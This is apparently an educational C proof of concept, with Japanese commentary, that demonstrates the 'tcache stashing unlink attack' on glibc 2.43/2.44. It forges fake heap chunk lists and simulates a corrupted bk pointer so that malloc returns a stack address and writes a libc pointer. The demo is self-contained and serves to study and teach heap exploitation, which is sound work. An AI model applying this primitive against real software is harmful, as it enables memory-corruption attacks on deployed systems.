#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*
 * tcache stashing unlink attack のデモ
 * PoC の作者は Imrane Haddaji (@tabacc0)、対象バージョンは 2.43/2.44
 *
 * 技法の功績は元の作者に帰属します
*/

int main(){
	printf("これは tcache stashing unlink attack のデモンストレーションです\n");
	printf("この PoC は glibc 2.43-2.44 に対してリンクし、テストしています \n");
	printf("目標は、SmallBin から Tcache への stashing の仕組みを使って、\n");
	printf("任意のチャンクを返させることです。ここではスタック上のチャンクを返させたいと考えます\n");
	printf("この技法では、任意の場所に libc のアドレスを書き込むこともできます\n");

	char * target_chunk[4] = {0};
	char **target = &target_chunk[2];

	printf("ターゲット : %p\n",target);
	printf("メタデータ分を考慮すると、ターゲットのチャンクアドレスは : %p\n",target_chunk);


	printf("tcache のメタデータのチャンクは、glibc 2.43-2.44 ではそれぞれ、Tcache サイズでの\n");
	printf("最初の free 呼び出し時に確保・初期化されます。\n,");
	printf("(__libc_free と tcache_free_init の各関数を参照)\n");
	printf("tcache の確保がヒープのレイアウトを乱さないよう、今のうちに\n");
	printf("Tcache サイズのチャンクを確保して解放しておきます。こうすると\n");
	printf("どちらのバージョンでも動作します\n");
	char * init_tcache = malloc(0x100);
	free(init_tcache);


	printf("次に被害者のチャンクを確保します。Tcache を満たしたり空にしたりする確保を\n");
	printf("使わずに済むよう、LargeBin サイズのチャンクとして確保し、unsorted");
	printf("Bin に入れてから、残りが\n");
	printf("SmallBin サイズになるよう慎重に選んだサイズのチャンクを確保して切り出します");
	char **victim = malloc(0x500);
	printf("まず victim の後ろに、top との統合(consolidation)を避けるためのガードチャンクを確保します\n");
	char *guard = malloc(0x1000);
	printf("次に victim を解放します。victim は UnsortedBin に入ります\n");
	free(victim);
	printf("victim から切り出されるチャンクを確保します。残りのサイズは、\n");
	printf("今回は 0x100 で、malloc(0x90) に対応します\n");
	char *cut_victim = malloc(0x400);
	printf("切り出したことで victim は前方に「移動」したので、victim ポインタを\n");
	printf("それに合わせて更新します\n");
	victim = victim + 0x410/8;
	char **victim_chunk = victim - 2;
	char *put_smallbin = malloc(0x1000);

	printf("\n次に、ヒープ上に偽のチャンクのリストを 2 つ作り、つなげます\n");
	printf("こうして 15 個のチャンクからなる結合リストにします\n");

	printf("\n2.43/2.44 では tcache の bin のデフォルトサイズは、以前のバージョンの 7 ではなく\n");
	printf("16 であることに注意してください。そのため、ターゲットのチャンクはリストの 16 番目のチャンクになります");

	printf("\nリストを 2 つ作る理由は、malloc がリストのチャンクで\n");
	printf("tcache を満たし始めるとき、それらのチャンクの inuse ビットも\n");
	printf("設定し始めますが、それらのチャンクは偽物で、メモリ上に連続して並んだ\n");
	printf("チャンクヘッダにすぎないため、inuse ビットの設定がリストの先にあるチャンクヘッダを\n");
	printf("破壊してしまうからです。これは、これらのバージョンで特に\n");
	printf("問題になっています。tcache のサイズが 16 に増えたためです。\n");


	printf("ガードとソートに使った、すでに使われていないチャンクがあるので、それらを\n");
	printf("リストとして使います\n");
	char *(*fake_chunklist0)[4] = (char *(*)[4]) guard;
	char *(*fake_chunklist1)[4] = (char *(*)[4]) put_smallbin;

	for (int i = 0 ; i < 6 ; i++){
		fake_chunklist0[i][3] = (char *) &fake_chunklist0[i+1];
	}
	fake_chunklist0[6][3] = (char *) fake_chunklist1[0];
	for (int i = 0 ; i < 7 ; i++){
		fake_chunklist1[i][3] = (char *) &fake_chunklist1[i+1];
	}

	printf("\n結合リストの最後の要素が target_chunk を指すようにして、\n");
	printf("リストの 16 番目のチャンクになるようにします\n");
	fake_chunklist1[7][3] = (char *) target_chunk;

	printf("\nSmallBin の破壊チェックを回避するため、リストの先頭の fd ポインタが\n");
	printf("victim を指すようにします\n");
	fake_chunklist0[0][2] = (char *) victim_chunk;

	printf("\n次に target_chunk->bk が target_+0x10 を指すようにします。こうすると libc のポインタが\n");
	printf("target_chunk + 0x20 に書き込まれます。\n");
	target_chunk[3] = (char *) target ;


	printf("\n\n次に、victim->bk がチャンクリストの先頭を指すようにできる\n");
	printf("脆弱性を模擬します\n");
	//VULNERABILITY
	victim_chunk[3] = (char*)fake_chunklist0[0];
	//VULNERABILITY

	printf("\nサイズ 0x90 のチャンクを確保して stashing を引き起こします\n");
	char *trigger_chain = malloc(0xf0);
	printf("\nこれで、リストの最後の要素である target_chunk により、target が\n");
	printf("tcache bin の先頭に来ます\n");
	printf("次の確保は target を指すはずです\n");
	printf("char **tc_head = malloc(0xf0);\n");
	char **tc_head = malloc(0xf0);
	printf("\n\nassert(tc_head == target);\n");
	assert(tc_head == target);
	printf("さらに、target + 0x10 バイトは libc のアドレスになっているはずです:\n");
	printf("\n%p\n",target[2]);
	exit(0);
}
